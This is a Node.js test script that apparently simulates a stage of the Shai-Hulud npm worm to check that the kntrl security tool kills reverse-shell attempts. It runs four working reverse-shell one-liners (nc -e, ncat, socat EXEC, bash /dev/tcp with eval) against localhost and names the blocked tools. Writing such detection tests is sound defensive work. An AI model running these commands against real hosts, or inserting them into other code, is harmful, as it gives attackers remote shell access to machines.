/**
 * Stage 9 — Reverse shell attempt
 *
 * Some variants of the Shai-Hulud worm attempt to establish a reverse
 * shell back to the attacker for interactive access. Tools used:
 *   - nc / ncat: traditional reverse shell
 *   - socat: encrypted reverse shell
 *   - node net.Socket: JavaScript-native reverse shell
 *
 * kntrl detection:
 *   - YAML blocked_executables: nc, ncat, socat → SIGKILL at execve
 *   - YAML blocked_chains: blocks bash/sh from npm ancestry
 *   - Network: connection to non-allowed host blocked by OPA
 *
 * SAFE: Connects to localhost on a port that nothing listens on.
 * kntrl kills the process before any connection is established.
 */

const { execSync } = require("child_process");

// --- Attempt 1: nc reverse shell (SIGKILL via blocked_executables) ---
console.log("  [revshell] Attempting nc reverse shell to localhost:4444 ...");
try {
  execSync(`nc -e /bin/sh 127.0.0.1 4444`, {
    stdio: "inherit",
    timeout: 5000,
  });
  console.log("  [revshell] WARNING: nc succeeded (kntrl should SIGKILL this!)");
} catch (err) {
  if (err.signal === "SIGKILL") {
    console.log("  [revshell] nc killed by kntrl (SIGKILL) — blocked_executables working");
  } else {
    console.log("  [revshell] nc failed — expected (blocked or not installed)");
  }
}

// --- Attempt 2: ncat with SSL (SIGKILL via blocked_executables) ---
console.log("  [revshell] Attempting ncat reverse shell ...");
try {
  execSync(`ncat --ssl 127.0.0.1 4444`, {
    stdio: "inherit",
    timeout: 5000,
  });
  console.log("  [revshell] WARNING: ncat succeeded (kntrl should SIGKILL this!)");
} catch (err) {
  if (err.signal === "SIGKILL") {
    console.log("  [revshell] ncat killed by kntrl (SIGKILL) — blocked_executables working");
  } else {
    console.log("  [revshell] ncat failed — expected (blocked or not installed)");
  }
}

// --- Attempt 3: socat (SIGKILL via blocked_executables) ---
console.log("  [revshell] Attempting socat reverse shell ...");
try {
  execSync(`socat TCP:127.0.0.1:4444 EXEC:/bin/sh`, {
    stdio: "inherit",
    timeout: 5000,
  });
  console.log("  [revshell] WARNING: socat succeeded (kntrl should SIGKILL this!)");
} catch (err) {
  if (err.signal === "SIGKILL") {
    console.log("  [revshell] socat killed by kntrl (SIGKILL) — blocked_executables working");
  } else {
    console.log("  [revshell] socat failed — expected (blocked or not installed)");
  }
}

// --- Attempt 4: bash reverse shell via /dev/tcp ---
console.log("  [revshell] Attempting bash /dev/tcp reverse shell ...");
try {
  execSync(`bash -c "exec 5<>/dev/tcp/127.0.0.1/4444; cat <&5 | while read line; do eval \\$line 2>&1 | tee >&5; done"`, {
    stdio: "inherit",
    timeout: 5000,
  });
  console.log("  [revshell] WARNING: bash reverse shell succeeded (should be blocked!)");
} catch (err) {
  if (err.signal === "SIGKILL") {
    console.log("  [revshell] bash killed by kntrl (SIGKILL) — shell-from-npm block working");
  } else {
    console.log("  [revshell] bash reverse shell failed — expected");
  }
}
